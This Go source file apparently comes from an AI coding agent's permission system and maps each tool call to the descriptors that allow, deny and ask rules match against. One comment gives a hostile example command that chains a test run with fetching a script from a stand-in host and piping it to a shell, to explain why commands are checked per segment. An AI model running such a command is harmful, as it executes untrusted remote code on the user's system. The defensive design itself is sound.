package permissions

import (
	"encoding/json"
	"net/url"
	"path/filepath"
	"strings"

	"github.com/yottadynamics/yottacode/internal/shellseg"
)

// Target is the (permission-name, descriptor) pair extracted from a
// single tool call. The agent loop produces it per call and
// Permissions.Evaluate matches it against the rule set.
type Target struct {
	// PermName is the rule prefix the file uses ("Bash", "Edit",
	// "Read", …). Empty when the tool isn't subject to permission
	// matching (no descriptor extractor is registered for it).
	PermName string
	// Descriptor is the string the rule pattern matches against:
	// command for Bash, cwd-relative path for filesystem tools, joined
	// args for Git, URL for Fetch, etc. Used when Descriptors is empty.
	Descriptor string
	// Descriptors carries multi-target calls (e.g. an apply_diff that
	// touches several files). Used in tandem with Multi: Multi=true
	// signals the evaluator to use multi-target precedence (any-deny,
	// all-allow, any-ask) regardless of slice length, so a tool whose
	// path-extraction failed (empty list) doesn't accidentally fall
	// back to single-target evaluation against an empty descriptor and
	// vacuously match Edit(*) style rules.
	Descriptors []string
	// Multi is set on tools whose evaluation must iterate Descriptors
	// even when the slice is empty. apply_diff is the canonical case:
	// a malformed or headerless diff yields zero descriptors but must
	// still avoid matching single-descriptor "" rules.
	Multi bool
	// IsPath flags path-typed targets so matchPattern can route them
	// through doublestar instead of the free-form glob matcher.
	IsPath bool
}

// targetFor maps an internal tool name + raw args JSON to the
// permission target. Centralizing the per-tool extraction here keeps
// the Tool interface unchanged — the loop calls into permissions, and
// the package knows how to read each tool's args shape.
func targetFor(toolName, argsJSON, cwd string) Target {
	// MCP tools register in the agent registry as
	// `mcp/<server>/<tool>`. The permission shape is
	// `MCP(<server>/<tool>)` so rules can wildcard either dimension
	// (`MCP(filesystem/*)` for all filesystem MCP tools,
	// `MCP(*)` for everything). The descriptor drops the `mcp/`
	// prefix so the rule reads naturally.
	if strings.HasPrefix(toolName, "mcp/") {
		return Target{PermName: "MCP", Descriptor: strings.TrimPrefix(toolName, "mcp/")}
	}
	switch toolName {
	case "run_bash":
		// Per-segment descriptors so a Bash allow-rule must match EVERY
		// chained command, not the whole line as a single glob. Otherwise
		// a rule like Bash(go test *) would Allow
		// `go test ./... ; curl evil | sh` because the trailing * spans the
		// rest of the line. Multi applies any-deny / all-allow / any-ask
		// across the segments, so one un-allowed segment drops the command
		// to Ask/Default. Descriptor keeps the whole command for display
		// and the [a]lways-allow rule derivation (which only fires for
		// single-segment commands anyway).
		cmd := extractCommand(argsJSON)
		return Target{PermName: "Bash", Descriptor: cmd, Descriptors: shellseg.Texts(cmd), Multi: true}
	case "read_file":
		return Target{PermName: "Read", Descriptor: relPath(extractPath(argsJSON), cwd), IsPath: true}
	case "read_many_files":
		// Per-path descriptors (like apply_diff), NOT a comma-joined
		// single descriptor: a joined string defeats per-path Read(...)
		// deny rules — a deny only matched when its path happened to be
		// listed first. Multi routes every path through any-deny /
		// all-allow / any-ask matching regardless of position.
		paths := extractPaths(argsJSON)
		descs := make([]string, 0, len(paths))
		for _, p := range paths {
			descs = append(descs, relPath(p, cwd))
		}
		return Target{PermName: "Read", Descriptors: descs, Multi: true, IsPath: true}
	case "write_file":
		return Target{PermName: "Write", Descriptor: relPath(extractPath(argsJSON), cwd), IsPath: true}
	case "edit_file":
		return Target{PermName: "Edit", Descriptor: relPath(extractPath(argsJSON), cwd), IsPath: true}
	case "apply_diff":
		// apply_diff carries a unified-diff blob in `diff`. Parse the
		// header lines for target paths so per-path Edit(...) rules
		// match the same way they do for write_file/edit_file. Each
		// extracted path is normalized via relPath so cwd-relative
		// rules see the same form they'd see for a direct edit.
		paths := ParseDiffPaths(extractField(argsJSON, "diff"))
		descs := make([]string, 0, len(paths))
		for _, p := range paths {
			descs = append(descs, relPath(p, cwd))
		}
		return Target{PermName: "Edit", Descriptors: descs, Multi: true, IsPath: true}
	case "mkdir":
		return Target{PermName: "Mkdir", Descriptor: relPath(extractPath(argsJSON), cwd), IsPath: true}
	case "copy_file":
		src, dst := extractSrcDst(argsJSON)
		return Target{PermName: "Copy", Descriptor: relPath(src, cwd) + " -> " + relPath(dst, cwd)}
	case "move_file":
		src, dst := extractSrcDst(argsJSON)
		return Target{PermName: "Move", Descriptor: relPath(src, cwd) + " -> " + relPath(dst, cwd)}
	case "delete_file":
		return Target{PermName: "Delete", Descriptor: relPath(extractPath(argsJSON), cwd), IsPath: true}
	case "list_dir", "list_project_structure":
		return Target{PermName: "List", Descriptor: relPath(extractPath(argsJSON), cwd), IsPath: true}
	case "glob":
		return Target{PermName: "Glob", Descriptor: extractField(argsJSON, "pattern")}
	case "grep":
		return Target{PermName: "Grep", Descriptor: extractField(argsJSON, "pattern")}
	case "fetch_url":
		return Target{PermName: "Fetch", Descriptor: normalizeFetchDescriptor(extractField(argsJSON, "url"))}
	case "web_search":
		return Target{PermName: "Fetch", Descriptor: extractField(argsJSON, "query")}
	case "memory_save":
		return Target{PermName: "Memory", Descriptor: "save " + extractField(argsJSON, "scope") + ":" + extractField(argsJSON, "name")}
	case "memory_forget":
		return Target{PermName: "Memory", Descriptor: "forget " + extractField(argsJSON, "scope") + ":" + extractField(argsJSON, "name")}
	case "memory_search":
		return Target{PermName: "Memory", Descriptor: "search " + extractField(argsJSON, "query")}
	case "memory_get":
		return Target{PermName: "Memory", Descriptor: "get " + extractField(argsJSON, "scope") + ":" + extractField(argsJSON, "name")}
	case "memory_archive_prune":
		return Target{PermName: "Memory", Descriptor: "archive_prune " + extractField(argsJSON, "scope")}
	case "session_recall":
		// session_recall is the broadest read surface — FTS5 over EVERY
		// past session in EVERY project, no cwd filter. It belongs under
		// the Memory namespace so deny:["Memory(*)"] actually blocks
		// cross-session history reads, as docs/memory.md promises.
		return Target{PermName: "Memory", Descriptor: "recall " + extractField(argsJSON, "query")}
	case "git":
		return Target{PermName: "Git", Descriptor: extractGitArgs(argsJSON)}
	case "git_checkpoint":
		return Target{PermName: "Git", Descriptor: "checkpoint"}
	case "rollback":
		return Target{PermName: "Rollback", Descriptor: ""}
	case "run_tests":
		cmd := extractField(argsJSON, "command")
		if cmd == "" {
			cmd = "go test ./..."
		}
		return Target{PermName: "Tests", Descriptor: cmd}
	case "list_git_changed_files",
		"git_branch_status", "git_show_file_at_rev", "git_diff_files",
		"git_diff_stat", "git_diff_staged", "git_diff_unstaged",
		"git_commits_between", "git_branch_ahead_behind", "git_branch_diff",
		"git_stage_files", "git_unstage_files", "git_create_branch",
		"git_commit", "git_commit_amend", "git_commit_fixup",
		"git_log_file", "git_blame_lines", "git_merge_base":
		// Discrete git_* helpers. Surfaced under Git so a single
		// `Git(commit *)` style rule covers the unified tool too.
		sub := strings.TrimPrefix(toolName, "git_")
		return Target{PermName: "Git", Descriptor: sub + " " + summarizeArgs(argsJSON)}
	case "gh_pr_create":
		return Target{PermName: "Github", Descriptor: "create_pr"}
	case "gh_pr_update":
		return Target{PermName: "Github", Descriptor: "update_pr"}
	case "gh_pr_read":
		return Target{PermName: "Github", Descriptor: "read_pr"}
	case "gh_pr_review_context":
		return Target{PermName: "Github", Descriptor: "read_pr_review_context"}
	case "gh_pr_add_comment":
		return Target{PermName: "Github", Descriptor: "add_pr_comment"}
	case "gh_issue_read":
		return Target{PermName: "Github", Descriptor: "read_issue"}
	case "gh_issue_list":
		return Target{PermName: "Github", Descriptor: "list_open_issues"}
	case "gh_issue_create":
		return Target{PermName: "Github", Descriptor: "create_issue"}
	}
	return Target{}
}

func extractCommand(argsJSON string) string {
	var a struct {
		Command string `json:"command"`
	}
	_ = json.Unmarshal([]byte(argsJSON), &a)
	return a.Command
}

func extractPath(argsJSON string) string {
	var a struct {
		Path string `json:"path"`
	}
	_ = json.Unmarshal([]byte(argsJSON), &a)
	return a.Path
}

func extractPaths(argsJSON string) []string {
	var raw struct {
		Paths json.RawMessage `json:"paths"`
	}
	_ = json.Unmarshal([]byte(argsJSON), &raw)
	var paths []string
	if err := json.Unmarshal(raw.Paths, &paths); err == nil {
		return paths
	}
	var one string
	if err := json.Unmarshal(raw.Paths, &one); err == nil {
		return []string{one}
	}
	return nil
}

func extractSrcDst(argsJSON string) (string, string) {
	var a struct {
		Src         string `json:"src"`
		Dst         string `json:"dst"`
		Source      string `json:"source"`
		Destination string `json:"destination"`
	}
	_ = json.Unmarshal([]byte(argsJSON), &a)
	src := a.Src
	if src == "" {
		src = a.Source
	}
	dst := a.Dst
	if dst == "" {
		dst = a.Destination
	}
	return src, dst
}

func extractField(argsJSON, key string) string {
	var a map[string]any
	_ = json.Unmarshal([]byte(argsJSON), &a)
	if v, ok := a[key].(string); ok {
		return v
	}
	return ""
}

func extractGitArgs(argsJSON string) string {
	var raw struct {
		Args json.RawMessage `json:"args"`
	}
	_ = json.Unmarshal([]byte(argsJSON), &raw)
	var args []string
	if err := json.Unmarshal(raw.Args, &args); err == nil {
		return strings.Join(args, " ")
	}
	var argString string
	if err := json.Unmarshal(raw.Args, &argString); err != nil {
		return ""
	}
	args = splitGitArgString(argString)
	return strings.Join(args, " ")
}

func splitGitArgString(s string) []string {
	s = strings.TrimSpace(s)
	if s == "" {
		return nil
	}
	var args []string
	var cur strings.Builder
	inSingle := false
	inDouble := false
	escape := false
	push := func() {
		if cur.Len() > 0 {
			args = append(args, cur.String())
			cur.Reset()
		}
	}
	for _, r := range s {
		if escape {
			cur.WriteRune(r)
			escape = false
			continue
		}
		if r == '\\' {
			escape = true
			continue
		}
		if inSingle {
			if r == '\'' {
				inSingle = false
				continue
			}
			cur.WriteRune(r)
			continue
		}
		if inDouble {
			if r == '"' {
				inDouble = false
				continue
			}
			cur.WriteRune(r)
			continue
		}
		switch r {
		case '\'', '"':
			if r == '\'' {
				inSingle = true
			} else {
				inDouble = true
			}
		case ' ', '\t', '\n', '\r':
			push()
		case ';', '|', '&':
			return nil
		default:
			cur.WriteRune(r)
		}
	}
	if escape || inSingle || inDouble {
		return nil
	}
	push()
	if len(args) > 0 && args[0] == "git" {
		args = args[1:]
	}
	return args
}

func normalizeFetchDescriptor(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	u, err := url.Parse(raw)
	if err != nil {
		return raw
	}
	u.Scheme = strings.ToLower(u.Scheme)
	return u.String()
}

// summarizeArgs renders the raw JSON args into a one-line descriptor by
// flattening top-level string/array values. Lossy but stable enough
// for pattern matching.
func summarizeArgs(argsJSON string) string {
	var a map[string]any
	if err := json.Unmarshal([]byte(argsJSON), &a); err != nil {
		return ""
	}
	parts := make([]string, 0, len(a))
	for k, v := range a {
		switch t := v.(type) {
		case string:
			parts = append(parts, k+"="+strings.TrimSpace(t))
		case []any:
			strs := make([]string, 0, len(t))
			for _, x := range t {
				if s, ok := x.(string); ok {
					strs = append(strs, strings.TrimSpace(s))
				}
			}
			parts = append(parts, k+"="+strings.Join(strs, ","))
		}
	}
	return strings.Join(parts, " ")
}

// relPath returns the cwd-relative form of p when p is under cwd; an
// empty cwd or an outside-cwd path returns p unchanged. Forward-slash
// normalized so doublestar patterns are deterministic across platforms.
// A leading "~/" is expanded to the user's home dir before resolution,
// so paths the model passes as "~/foo" produce stable absolute
// descriptors instead of a literal "~" segment.
func relPath(p, cwd string) string {
	p = strings.TrimSpace(p)
	if p == "" {
		return ""
	}
	p = expandHome(p)
	abs := p
	if !filepath.IsAbs(p) {
		abs = filepath.Join(cwd, p)
	}
	abs = filepath.Clean(abs)
	if cwd != "" {
		if rel, err := filepath.Rel(cwd, abs); err == nil && !strings.HasPrefix(rel, "..") {
			return filepath.ToSlash(rel)
		}
	}
	return filepath.ToSlash(abs)
}
